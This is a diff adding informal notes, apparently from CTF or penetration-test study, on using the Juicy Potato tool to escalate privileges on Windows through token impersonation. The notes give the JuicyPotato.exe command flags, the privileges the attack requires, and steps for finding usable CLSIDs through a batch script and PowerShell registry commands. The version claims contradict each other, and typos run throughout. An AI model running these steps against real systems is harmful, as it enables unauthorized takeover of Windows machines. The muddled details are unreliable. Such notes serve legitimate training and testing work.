@@ -1,0 +1,28 @@
+juicy potato 
+
+exploits the way Microsoft handles tokens. Through this, we achieve privilege escalation. 
+%%%%%it will work in windows after 2018%%%%%%%%
+microsoft fix it win windows 2019
+The only real requirement however, is that the account has the
+SeAssignPrimaryTokenPrivilege and/or SeImpersonatePrivilege
+
+
+
+
+
+JuicyPotato.exe -t * (to try all) ip -p <program>: program to launch -l <port>: COM server listen port (any not used port to lunch in windows) 
+
+optional:
+
+-c <{clsid}>: clsid is a identifer for softwrare so you may wnat to change it so use -c and pick a clsid from github repo of juicy potato
+
+
+if you cant get the right clsid so you must try all combination : (watch fighter IPPSEC)
+1- got to juicy pototo repo and download /Test/test_clsid.bat whis will test all clsid in list and put the result in file "you must edite it (put full path for your potato and something else)"
+2- generate clsids by type some powershell command from CLSID/GetCLSID.ps1 
+  take these: > New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT
+              > $CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object {$_.appid -ne $null}
+              >$CLSID
+
+3- copy the result and put the clsid columun un file and name it like found in bat file (CLSID.list)
+4- whatch the result in log file 
